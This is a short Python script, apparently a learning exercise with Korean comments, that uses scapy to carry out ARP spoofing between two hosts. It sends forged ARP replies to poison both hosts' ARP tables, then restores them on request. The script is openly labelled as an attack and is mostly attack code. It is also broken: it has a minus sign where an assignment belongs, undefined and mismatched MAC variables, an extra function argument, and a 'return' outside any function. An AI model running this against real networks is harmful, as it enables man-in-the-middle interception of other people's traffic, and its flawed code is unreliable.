from scapy.all import *
from scapy.layers.l2 import Ether, ARP

'''
8 line 왜 Ether 헤더를 붙이는지
'''
def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')

def attack_ARP(A_ip, B_ip, A_mac, B_MAC):
    #A의 ARP 테이블 공격
    arp1 = ARP(op=2, pdst=A_ip, psrc=B_ip, hwdst=A_MAC)
    send(arp1)
    #B의 ARP 테이블 공격
    arp2 = ARP(op=2, pdst=B_ip, psrc=A_ip, hwdst=B_MAC)
    send(arp2)

def restore_ARP(A_ip, B_ip, A_MAC, B_MAC):
    #A의 ARP 테이블 복구
    arp1 = ARP(op=2, pdst=A_ip, psrc=B_ip, hwdst=A_MAC, hwsrc=B_MAC)
    send(arp1)
    #B의 ARP 테이블 복구
    arp2 = ARP(op=2, pdst=B_ip, psrc=A_ip, hwdst=B_MAC, hwsrc=A_MAC)
    send(arp2)

if __name__ == '__main__':
    A_ip = ''
    B_ip - ''

    A_mac = getMAC(A_ip)
    B_mac = getMAC(B_ip)

    if A_mac == None or B_mac == None:
        print("MAC주소를 찾을 수 없습니다. A와 B가 활성화되어 있는지 확인하십시오.")
        return

    print('ARP Spoofing 시작')
    #ARP 테이블 공격
    attack_ARP(A_ip, B_ip, A_mac, B_MAC, M_MAC)

    str = input("공격을 마치려면 Q를 입력하세요.")
    if str == 'Q':
        #ARP 테이블 복구
        restore_ARP(A_ip, B_ip, A_mac, B_mac)
        print('ARP 테이블 복구. ARP Spoofing 종료')
        return
